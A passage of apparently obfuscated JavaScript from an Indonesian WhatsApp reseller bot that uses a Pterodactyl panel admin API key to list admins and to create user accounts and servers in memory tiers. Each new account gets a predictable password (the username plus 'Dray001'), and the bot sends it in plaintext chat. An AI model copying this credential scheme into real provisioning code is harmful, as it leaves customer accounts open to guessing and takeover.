            text: "*BERIKUT DETAIL AKUN ADMIN  PANEL ANDA*\n\n\n*🗃️USERNAME* : " + v872.username + "\n*🔒PASSWORD* : " + v868 + "\n*🚬LOGIN* : " + domain + "\n\n*📦INFO PANEL* : https://chat.whatsapp.com/FKgszhQiJsE1h21GIDylOU\n*🔑TUTOR* : https://youtu.be/Nq4uxw_1ihQ?si=JN076DTFlmjZyCSd\n\n*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*\n\n\n"
          });
        }
        break;
      case "listadmin":
        {
          if (!v700 && !v698) {
            return vF9("Maaf, Anda tidak dapat melihat daftar pengguna.");
          }
          let v875 = v643[0] ? v643[0] : "1";
          let v876 = await fetch(domain + "/api/application/users?page=" + v875, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          let v877 = await v876.json();
          let v878 = v877.data;
          let v879 = "Berikut list admin BY dray:\n\n";
          for (let v880 of v878) {
            let v881 = v880.attributes;
            if (v881.root_admin) {
              v879 += "ID: " + v881.id + " - Status: " + (v881.attributes?.user?.server_limit === null ? "Inactive" : "Active") + "\n";
              v879 += v881.username + "\n";
              v879 += v881.first_name + " " + v881.last_name + "\n\n";
              v879 += "BY dray";
            }
          }
          v879 += "Page: " + v877.meta.pagination.current_page + "/" + v877.meta.pagination.total_pages + "\n";
          v879 += "Total Admin: " + v877.meta.pagination.count;
          await p147.sendMessage(p148.chat, {
            text: v879
          }, {
            quoted: p148
          });
          if (v877.meta.pagination.current_page < v877.meta.pagination.total_pages) {
            p148.reply("Gunakan perintah " + v626 + "listusr " + (v877.meta.pagination.current_page + 1) + " untuk melihat halaman selanjutnya.");
          }
        }
        break;
      case "1gb":
        {
          if (!v700 && !v697 && !v699 && !v698) {
            return vF9(mess.only.premium);
          }
          let v882 = v646.split(",");
          if (v882.length < 2) {
            return p148.reply("*Format salah!*\nPenggunaan:\n" + (v626 + v642) + " user,nomer");
          }
          let v883 = v882[0];
          let v884 = p148.quoted ? p148.quoted.sender : v882[1] ? v882[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : p148.mentionedJid[0];
          let v885 = v883 + "1gb";
          let v886 = global.eggsnya;
          let v887 = global.location;
          let v888 = "1024";
          let v889 = "30";
          let v890 = "1024";
          let v891 = v883 + "1398@dray.com";
          akunlo = "https://8030.us.kg/file/IvWXFmwOAfA0.jpg";
          if (!v884) {
            return;
          }
          let v892 = (await p147.onWhatsApp(v884.split`@`[0]))[0] || {};
          let v893 = v883 + "Dray001";
          let v894 = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              email: v891,
              username: v883,
              first_name: v883,
              last_name: v883,
              language: "en",
              password: v893
            })
          });
          let v895 = await v894.json();
          if (v895.errors) {
            return p148.reply(JSON.stringify(v895.errors[0], null, 2));
          }
          let v896 = v895.attributes;
          let v897 = await fetch(domain + "/api/application/nests/5/eggs/" + v886, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          p148.reply("𝐒𝐔𝐂𝐂𝐄𝐒 𝐂𝐑𝐄𝐀𝐓𝐄 𝐘𝐎𝐔𝐑 𝐏𝐀𝐍𝐄𝐋\n *DONE CRATE USER + SERVER ID :* " + v896.id + "\nJANGAN LUPA DI PAKE YAH ASU\nKALO NGGA NANTI DI DI DELETE BANG DRAY\n> Zeno Cpanel");
          ctf = "Hai @" + v884.split`@`[0] + "\n\n*➣ USERNAME* : " + v896.username + "\n*➣ PASSWORD* : " + v893 + "\n*➣ LOGIN* : " + domain + "\n*➥ INFO PANEL* : https://whatsapp.com/channel/0029Vaj4X9iAInPuhzUk3v1L\n*➥TUTOR* : https://youtu.be/Nq4uxw_1ihQ?si=JN076DTFlmjZyCSd\n\n➻ NOTE : \n⪩ BOT HANYA MENGIRIM DATA AKUN 1X\n⪩ DILARANG KERAS MEMBAGIKAN LINK LOGIN\n⪩ GARANSI 20 DAY\n⪩ WAJIB BAWA BUKTI TRANSAKSI JIKA CLAIM GARANSI\n⪩ SCREENSHOT CHAT DATA AKUN INI AGAR TIDAK HILANG\n> Zeno Cpanel";
          p147.sendMessage(v884, {
            image: {
              url: akunlo
            },
            caption: ctf
          }, {
            quoted: p147.chat
          });
          let v898 = await v897.json();
          let v899 = v898.attributes.startup;
          let v900 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: v885,
              description: " ",
              user: v896.id,
              egg: parseInt(v886),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: v899,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: {
                memory: v888,
                swap: 0,
                disk: v890,
                io: 500,
                cpu: v889
              },
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 1
              },
              deploy: {
                locations: [parseInt(v887)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let v901 = await v900.json();
          if (v901.errors) {
            return p148.reply(JSON.stringify(v901.errors[0], null, 2));
          }
          let v902 = v901.attributes;
          let v903 = await p148.reply("\n𝐙𝐄𝐍𝐎 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐌𝐄𝐌𝐁𝐔𝐀𝐓 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐊𝐀𝐌𝐔✔\n\n📩ID: " + v896.id + "\n📌NAME: " + v896.first_name + " " + v896.last_name + "\n💵MEMORY: " + (v902.limits.memory === 0 ? "Unlimited" : v902.limits.memory) + " MB\n📦DISK: " + (v902.limits.disk === 0 ? "Unlimited" : v902.limits.disk) + " MB\n⌛CPU: " + v902.limits.cpu + "%\n\n> © Zeno Cpanel\n");
        }
        break;
      case "2gb":
        {
          if (!v700 && !v697 && !v699 && !v698) {
            return vF9(mess.only.premium);
          }
          let v904 = v646.split(",");
          if (v904.length < 2) {
            return p148.reply("*Format salah!*\nPenggunaan:\n" + (v626 + v642) + " user,nomer");
          }
          let v905 = v904[0];
          let v906 = p148.quoted ? p148.quoted.sender : v904[1] ? v904[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : p148.mentionedJid[0];
          let v907 = v905 + "2gb";
          let v908 = global.eggsnya;
          let v909 = global.location;
          let v910 = "2048";
          let v911 = "50";
          let v912 = "2048";
          let v913 = v905 + "@dray.offc";
          akunlo = "https://8030.us.kg/file/IvWXFmwOAfA0.jpg";
          if (!v906) {
            return;
          }
          let v914 = (await p147.onWhatsApp(v906.split`@`[0]))[0] || {};
          let v915 = v905 + "Dray001";
          let v916 = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              email: v913,
              username: v905,
              first_name: v905,
              last_name: v905,
              language: "en",
              password: v915
            })
          });
          let v917 = await v916.json();
          if (v917.errors) {
            return p148.reply(JSON.stringify(v917.errors[0], null, 2));
          }
          let v918 = v917.attributes;
          let v919 = await fetch(domain + "/api/application/nests/5/eggs/" + v908, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          p148.reply("𝐒𝐔𝐂𝐂𝐄𝐒 𝐂𝐑𝐄𝐀𝐓𝐄 𝐘𝐎𝐔𝐑 𝐏𝐀𝐍𝐄𝐋\n *DONE CRATE USER + SERVER ID :* " + v918.id + "\nJANGAN LUPA DI PAKE YAH ASU\nKALO NGGA NANTI DI DI DELETE BANG DRAY\n> Zeno Cpanel");
          ctf = "Hai @" + v906.split`@`[0] + "\n\n*➣ USERNAME* : " + v918.username + "\n*➣ PASSWORD* : " + v915 + "\n*➣ LOGIN* : " + domain + "\n*➥ INFO PANEL* : https://whatsapp.com/channel/0029Vaj4X9iAInPuhzUk3v1L\n*➥TUTOR* : https://youtu.be/Nq4uxw_1ihQ?si=JN076DTFlmjZyCSd\n\n➻ NOTE : \n⪩ BOT HANYA MENGIRIM DATA AKUN 1X\n⪩ DILARANG KERAS MEMBAGIKAN LINK LOGIN\n⪩ GARANSI 20 DAY\n⪩ WAJIB BAWA BUKTI TRANSAKSI JIKA CLAIM GARANSI\n⪩ SCREENSHOT CHAT DATA AKUN INI AGAR TIDAK HILANG\n> Zeno Cpanel\n";
          p147.sendMessage(v906, {
            image: {
              url: akunlo
            },
            caption: ctf
          }, {
            quoted: p147.chat
          });
          let v920 = await v919.json();
          let v921 = v920.attributes.startup;
          let v922 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: v907,
              description: " ",
              user: v918.id,
              egg: parseInt(v908),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: v921,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: {
                memory: v910,
                swap: 0,
                disk: v912,
                io: 500,
                cpu: v911
              },
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 1
              },
              deploy: {
                locations: [parseInt(v909)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let v923 = await v922.json();
          if (v923.errors) {
            return p148.reply(JSON.stringify(v923.errors[0], null, 2));
          }
          let v924 = v923.attributes;
          let v925 = await p148.reply("\n𝐙𝐄𝐍𝐎 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐌𝐄𝐌𝐁𝐔𝐀𝐓 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐊𝐀𝐌𝐔✔\n\n📩ID: " + v918.id + "\n📌NAME: " + v918.first_name + " " + v918.last_name + "\n💵MEMORY: " + (v924.limits.memory === 0 ? "Unlimited" : v924.limits.memory) + " MB\n📦DISK: " + (v924.limits.disk === 0 ? "Unlimited" : v924.limits.disk) + " MB\n⌛CPU: " + v924.limits.cpu + "%\n\n> © Zeno Cpanel\n");
        }
        break;
      case "3gb":
        {
          if (!v700 && !v697 && !v699 && !v698) {
            return vF9(mess.only.premium);
          }
          let v926 = v646.split(",");
          if (v926.length < 2) {
            return p148.reply("*Format salah!*\nPenggunaan:\n" + (v626 + v642) + " user,nomer");
          }
          let v927 = v926[0];
          let v928 = p148.quoted ? p148.quoted.sender : v926[1] ? v926[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : p148.mentionedJid[0];
          let v929 = v927 + "3gb";
          let v930 = global.eggsnya;
          let v931 = global.location;
          let v932 = "3072";
          let v933 = "70";
          let v934 = "3072";
          let v935 = v927 + "@dray.offc";
          akunlo = "https://8030.us.kg/file/IvWXFmwOAfA0.jpg";
          if (!v928) {
            return;
          }
          let v936 = (await p147.onWhatsApp(v928.split`@`[0]))[0] || {};
          let v937 = v927 + "Dray001";
          let v938 = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              email: v935,
              username: v927,
              first_name: v927,
              last_name: v927,
              language: "en",
              password: v937
            })
          });
          let v939 = await v938.json();
          if (v939.errors) {
            return p148.reply(JSON.stringify(v939.errors[0], null, 2));
          }
          let v940 = v939.attributes;
          let v941 = await fetch(domain + "/api/application/nests/5/eggs/" + v930, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          p148.reply("𝐒𝐔𝐂𝐂𝐄𝐒 𝐂𝐑𝐄𝐀𝐓𝐄 𝐘𝐎𝐔𝐑 𝐏𝐀𝐍𝐄𝐋\n *DONE CRATE USER + SERVER ID :* " + v940.id + "\nJANGAN LUPA DI PAKE YAH ASU\nKALO NGGA NANTI DI DI DELETE BANG DRAY\n> Zeno Cpanel");
          ctf = "Hai @" + v928.split`@`[0] + "\n\n*➣ USERNAME* : " + v940.username + "\n*➣ PASSWORD* : " + v937 + "\n*➣ LOGIN* : " + domain + "\n*➥ INFO PANEL* : https://whatsapp.com/channel/0029Vaj4X9iAInPuhzUk3v1L\n*➥TUTOR* : https://youtu.be/Nq4uxw_1ihQ?si=JN076DTFlmjZyCSd\n\n➻ NOTE : \n⪩ BOT HANYA MENGIRIM DATA AKUN 1X\n⪩ DILARANG KERAS MEMBAGIKAN LINK LOGIN\n⪩ GARANSI 20 DAY\n⪩ WAJIB BAWA BUKTI TRANSAKSI JIKA CLAIM GARANSI\n⪩ SCREENSHOT CHAT DATA AKUN INI AGAR TIDAK HILANG\n> Zeno Cpanel\n";
          p147.sendMessage(v928, {
            image: {
              url: akunlo
            },
            caption: ctf
          }, {
            quoted: p147.chat
          });
          let v942 = await v941.json();
          let v943 = v942.attributes.startup;
          let v944 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: v929,
              description: " ",
              user: v940.id,
              egg: parseInt(v930),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: v943,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: {
                memory: v932,
                swap: 0,
                disk: v934,
                io: 500,
                cpu: v933
              },
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 1
              },
              deploy: {
                locations: [parseInt(v931)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let v945 = await v944.json();
          if (v945.errors) {
            return p148.reply(JSON.stringify(v945.errors[0], null, 2));
          }
          let v946 = v945.attributes;
          let v947 = await p148.reply("\n*𝐙𝐄𝐍𝐎 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐌𝐄𝐌𝐁𝐔𝐀𝐓 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐊𝐀𝐌𝐔✔\n\n📩ID: " + v940.id + "\n📌NAME: " + v940.first_name + " " + v940.last_name + "\n💵MEMORY: " + (v946.limits.memory === 0 ? "Unlimited" : v946.limits.memory) + " MB\n📦DISK: " + (v946.limits.disk === 0 ? "Unlimited" : v946.limits.disk) + " MB\n⌛CPU: " + v946.limits.cpu + "%\n\n> © Zeno Cpanel\n");
        }
        break;
      case "4gb":
        {
          if (!v700 && !v697 && !v699 && !v698) {
            return vF9(mess.only.premium);
          }
          let v948 = v646.split(",");
          if (v948.length < 2) {
            return p148.reply("*Format salah!*\nPenggunaan:\n" + (v626 + v642) + " user,nomer");
          }
          let v949 = v948[0];
          let v950 = p148.quoted ? p148.quoted.sender : v948[1] ? v948[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : p148.mentionedJid[0];
          let v951 = v949 + "4gb";
          let v952 = global.eggsnya;
          let v953 = global.location;
          let v954 = "4048";
          let v955 = "90";
          let v956 = "4048";
          let v957 = v949 + "@dray.offc";
          akunlo = "https://8030.us.kg/file/IvWXFmwOAfA0.jpg";
          if (!v950) {
            return;
          }
          let v958 = (await p147.onWhatsApp(v950.split`@`[0]))[0] || {};
          let v959 = v949 + "Dray001";
          let v960 = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              email: v957,
              username: v949,
              first_name: v949,
              last_name: v949,
              language: "en",
              password: v959
            })
          });
          let v961 = await v960.json();
          if (v961.errors) {
            return p148.reply(JSON.stringify(v961.errors[0], null, 2));
          }
          let v962 = v961.attributes;
          let v963 = await fetch(domain + "/api/application/nests/5/eggs/" + v952, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          p148.reply("𝐒𝐔𝐂𝐂𝐄𝐒 𝐂𝐑𝐄𝐀𝐓𝐄 𝐘𝐎𝐔𝐑 𝐏𝐀𝐍𝐄𝐋\n *DONE CRATE USER + SERVER ID :* " + v962.id + "\nJANGAN LUPA DI PAKE YAH ASU\nKALO NGGA NANTI DI DI DELETE BANG DRAY\n> Zeno Cpanel");
          ctf = "Hai @" + v950.split`@`[0] + "\n\n*➣ USERNAME* : " + v962.username + "\n*➣ PASSWORD* : " + v959 + "\n*➣ LOGIN* : " + domain + "\n*➥ INFO PANEL* : https://whatsapp.com/channel/0029Vaj4X9iAInPuhzUk3v1L\n*➥TUTOR* : https://youtu.be/Nq4uxw_1ihQ?si=JN076DTFlmjZyCSd\n\n➻ NOTE : \n⪩ BOT HANYA MENGIRIM DATA AKUN 1X\n⪩ DILARANG KERAS MEMBAGIKAN LINK LOGIN\n⪩ GARANSI 20 DAY\n⪩ WAJIB BAWA BUKTI TRANSAKSI JIKA CLAIM GARANSI\n⪩ SCREENSHOT CHAT DATA AKUN INI AGAR TIDAK HILANG\n> Zeno Cpanel\n";
          p147.sendMessage(v950, {
            image: {
              url: akunlo
            },
            caption: ctf
          }, {
            quoted: p147.chat
          });
          let v964 = await v963.json();
          let v965 = v964.attributes.startup;
          let v966 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: v951,
              description: " ",
              user: v962.id,
              egg: parseInt(v952),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: v965,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: {
                memory: v954,
                swap: 0,
                disk: v956,
                io: 500,
                cpu: v955
              },
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 1
              },
              deploy: {
                locations: [parseInt(v953)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let v967 = await v966.json();
          if (v967.errors) {
            return p148.reply(JSON.stringify(v967.errors[0], null, 2));
          }
          let v968 = v967.attributes;
          let v969 = await p148.reply("\n*𝐙𝐄𝐍𝐎 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐌𝐄𝐌𝐁𝐔𝐀𝐓 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐊𝐀𝐌𝐔✔\n\n📩ID: " + v962.id + "\n📌NAME: " + v962.first_name + " " + v962.last_name + "\n💵MEMORY: " + (v968.limits.memory === 0 ? "Unlimited" : v968.limits.memory) + " MB\n📦DISK: " + (v968.limits.disk === 0 ? "Unlimited" : v968.limits.disk) + " MB\n⌛CPU: " + v968.limits.cpu + "%\n\n> © Zeno Cpanel\n");
        }
        break;
      case "unli":
        {
          if (!v700 && !v697 && !v699 && !v698) {
            return vF9(mess.only.owner);
          }
          let v970 = v646.split(",");
          if (v970.length < 2) {
            return p148.reply("*Format salah!*\nPenggunaan:\n" + (v626 + v642) + " user,nomer");
          }
          let v971 = v970[0];
          let v972 = p148.quoted ? p148.quoted.sender : v970[1] ? v970[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : p148.mentionedJid[0];
          let v973 = v971 + "unli";
          let v974 = global.eggsnya;
          let v975 = global.location;
          let v976 = "0";
          let v977 = "0";
          let v978 = "0";
          let v979 = v971 + "@dray.offc";
          akunlo = "https://8030.us.kg/file/IvWXFmwOAfA0.jpg";
          if (!v972) {
            return;
          }
          let v980 = (await p147.onWhatsApp(v972.split`@`[0]))[0] || {};
          let v981 = v971 + "Dray001";
          let v982 = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              email: v979,
              username: v971,
              first_name: v971,
              last_name: v971,
              language: "en",
              password: v981
            })
          });
          let v983 = await v982.json();
          if (v983.errors) {
            return p148.reply(JSON.stringify(v983.errors[0], null, 2));
          }
          let v984 = v983.attributes;
          let v985 = await fetch(domain + "/api/application/nests/5/eggs/" + v974, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          p148.reply("𝐒𝐔𝐂𝐂𝐄𝐒 𝐂𝐑𝐄𝐀𝐓𝐄 𝐘𝐎𝐔𝐑 𝐏𝐀𝐍𝐄𝐋\n *DONE CRATE USER + SERVER ID :* " + v984.id + "\nJANGAN LUPA DI PAKE YAH ASU\nKALO NGGA NANTI DI DI DELETE BANG DRAY\n> Zeno Cpanel");
          ctf = "Hai @" + v972.split`@`[0] + "\n\n*➣ USERNAME* : " + v984.username + "\n*➣ PASSWORD* : " + v981 + "\n*➣ LOGIN* : " + domain + "\n*➥ INFO PANEL* : https://whatsapp.com/channel/0029Vaj4X9iAInPuhzUk3v1L\n*➥TUTOR* : https://youtu.be/Nq4uxw_1ihQ?si=JN076DTFlmjZyCSd\n\n➻ NOTE : \n⪩ BOT HANYA MENGIRIM DATA AKUN 1X\n⪩ DILARANG KERAS MEMBAGIKAN LINK LOGIN\n⪩ GARANSI 20 DAY\n⪩ WAJIB BAWA BUKTI TRANSAKSI JIKA CLAIM GARANSI\n⪩ SCREENSHOT CHAT DATA AKUN INI AGAR TIDAK HILANG\n> Zeno Cpanel\n";
          p147.sendMessage(v972, {
            image: {
              url: akunlo
            },
            caption: ctf
          }, {
            quoted: p147.chat
          });
          let v986 = await v985.json();
          let v987 = v986.attributes.startup;
          let v988 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: v973,
              description: " ",
              user: v984.id,
              egg: parseInt(v974),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: v987,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: {
                memory: v976,
                swap: 0,
                disk: v978,
                io: 500,
                cpu: v977
              },
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 1
              },
              deploy: {
                locations: [parseInt(v975)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let v989 = await v988.json();
          if (v989.errors) {
            return p148.reply(JSON.stringify(v989.errors[0], null, 2));
          }
          let v990 = v989.attributes;
          let v991 = await p148.reply("\n𝐙𝐄𝐍𝐎 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐌𝐄𝐌𝐁𝐔𝐀𝐓 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐊𝐀𝐌𝐔✔\n\n📩ID: " + v984.id + "\n📌NAME: " + v984.first_name + " " + v984.last_name + "\n💵MEMORY: " + (v990.limits.memory === 0 ? "Unlimited" : v990.limits.memory) + " MB\n📦DISK: " + (v990.limits.disk === 0 ? "Unlimited" : v990.limits.disk) + " MB\n⌛CPU: " + v990.limits.cpu + "%\n\n> © Zeno Cpanel\n");
        }
        break;
      case "5gb":
        {
          if (!v700 && !v697 && !v699 && !v698) {
            return vF9(mess.only.premium);
          }
          let v992 = v646.split(",");
          if (v992.length < 2) {
            return p148.reply("*Format salah!*\nPenggunaan:\n" + (v626 + v642) + " user,nomer");
          }
          let v993 = v992[0];
          let v994 = p148.quoted ? p148.quoted.sender : v992[1] ? v992[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : p148.mentionedJid[0];
          let v995 = v993 + "5gb";
          let v996 = global.eggsnya;
          let v997 = global.location;
          let v998 = "5138";
          let v999 = "100";
          let v1000 = "5138";
          let v1001 = v993 + "@dray.offc";
          akunlo = "https://8030.us.kg/file/IvWXFmwOAfA0.jpg";
          if (!v994) {
            return;
          }
          let v1002 = (await p147.onWhatsApp(v994.split`@`[0]))[0] || {};
          let v1003 = v993 + "Dray001";
          let v1004 = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              email: v1001,
              username: v993,
              first_name: v993,
              last_name: v993,
              language: "en",
              password: v1003
            })
          });
          let v1005 = await v1004.json();
          if (v1005.errors) {
            return p148.reply(JSON.stringify(v1005.errors[0], null, 2));
          }
          let v1006 = v1005.attributes;
          let v1007 = await fetch(domain + "/api/application/nests/5/eggs/" + v996, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          p148.reply("𝐒𝐔𝐂𝐂𝐄𝐒 𝐂𝐑𝐄𝐀𝐓𝐄 𝐘𝐎𝐔𝐑 𝐏𝐀𝐍𝐄𝐋\n *DONE CRATE USER + SERVER ID :* " + v1006.id + "\nJANGAN LUPA DI PAKE YAH ASU\nKALO NGGA NANTI DI DI DELETE BANG DRAY\n> Zeno Cpanel");
          ctf = "Hai @" + v994.split`@`[0] + "\n\n*➣ USERNAME* : " + v1006.username + "\n*➣ PASSWORD* : " + v1003 + "\n*➣ LOGIN* : " + domain + "\n*➥ INFO PANEL* : https://whatsapp.com/channel/0029Vaj4X9iAInPuhzUk3v1L\n*➥TUTOR* : https://youtu.be/Nq4uxw_1ihQ?si=JN076DTFlmjZyCSd\n\n➻ NOTE : \n⪩ BOT HANYA MENGIRIM DATA AKUN 1X\n⪩ DILARANG KERAS MEMBAGIKAN LINK LOGIN\n⪩ GARANSI 20 DAY\n⪩ WAJIB BAWA BUKTI TRANSAKSI JIKA CLAIM GARANSI\n⪩ SCREENSHOT CHAT DATA AKUN INI AGAR TIDAK HILANG\n> Zeno Cpanel\n";
          p147.sendMessage(v994, {
            image: {
              url: akunlo
            },
            caption: ctf
          }, {
            quoted: p147.chat
          });
          let v1008 = await v1007.json();
          let v1009 = v1008.attributes.startup;
          let v1010 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              name: v995,
              description: " ",
              user: v1006.id,
              egg: parseInt(v996),
              docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
              startup: v1009,
              environment: {
                INST: "npm",
                USER_UPLOAD: "0",
                AUTO_UPDATE: "0",
                CMD_RUN: "npm start"
              },
              limits: {
                memory: v998,
                swap: 0,
                disk: v1000,
                io: 500,
                cpu: v999
              },
              feature_limits: {
                databases: 5,
                backups: 5,
                allocations: 1
              },
              deploy: {
                locations: [parseInt(v997)],
                dedicated_ip: false,
                port_range: []
              }
            })
          });
          let v1011 = await v1010.json();
          if (v1011.errors) {
            return p148.reply(JSON.stringify(v1011.errors[0], null, 2));
          }
          let v1012 = v1011.attributes;
          let v1013 = await p148.reply("\n*𝐙𝐄𝐍𝐎 𝐁𝐄𝐑𝐇𝐀𝐒𝐈𝐋 𝐌𝐄𝐌𝐁𝐔𝐀𝐓 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐊𝐀𝐌𝐔✔\n\n📩ID: " + v1006.id + "\n📌NAME: " + v1006.first_name + " " + v1006.last_name + "\n💵MEMORY: " + (v1012.limits.memory === 0 ? "Unlimited" : v1012.limits.memory) + " MB\n📦DISK: " + (v1012.limits.disk === 0 ? "Unlimited" : v1012.limits.disk) + " MB\n⌛CPU: " + v1012.limits.cpu + "%\n\n> © Zeno Cpanel\n");
        }
        break;
      case "6gb":
        {
          if (!v700 && !v697 && !v699 && !v698) {
            return vF9(mess.only.premium);
          }
          let v1014 = v646.split(",");
          if (v1014.length < 2) {
            return p148.reply("*Format salah!*\nPenggunaan:\n" + (v626 + v642) + " user,nomer");
          }
          let v1015 = v1014[0];
          let v1016 = p148.quoted ? p148.quoted.sender : v1014[1] ? v1014[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net" : p148.mentionedJid[0];
          let v1017 = v1015 + "6GB";
          let v1018 = global.eggsnya;
          let v1019 = global.location;
          let v1020 = "6138";
          let v1021 = "120";
          let v1022 = "6138";
          let v1023 = v1015 + "@dray.offc";
          akunlo = "https://8030.us.kg/file/IvWXFmwOAfA0.jpg";
          if (!v1016) {
            return;
          }
          let v1024 = (await p147.onWhatsApp(v1016.split`@`[0]))[0] || {};
          let v1025 = v1015 + "Dray001";
          let v1026 = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            },
            body: JSON.stringify({
              email: v1023,
              username: v1015,
              first_name: v1015,
              last_name: v1015,
              language: "en",
              password: v1025
            })
          });
          let v1027 = await v1026.json();
          if (v1027.errors) {
            return p148.reply(JSON.stringify(v1027.errors[0], null, 2));
          }
          let v1028 = v1027.attributes;
          let v1029 = await fetch(domain + "/api/application/nests/5/eggs/" + v1018, {
            method: "GET",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + apikey
            }
          });
          p148.reply("𝐒𝐔𝐂𝐂𝐄𝐒 𝐂𝐑𝐄𝐀𝐓𝐄 𝐘𝐎𝐔𝐑 𝐏𝐀𝐍𝐄𝐋\n *DONE CRATE USER + SERVER ID :* " + v1028.id + "\nJANGAN LUPA DI PAKE YAH ASU\nKALO NGGA NANTI DI DI DELETE BANG DRAY\n> Zeno Cpanel");
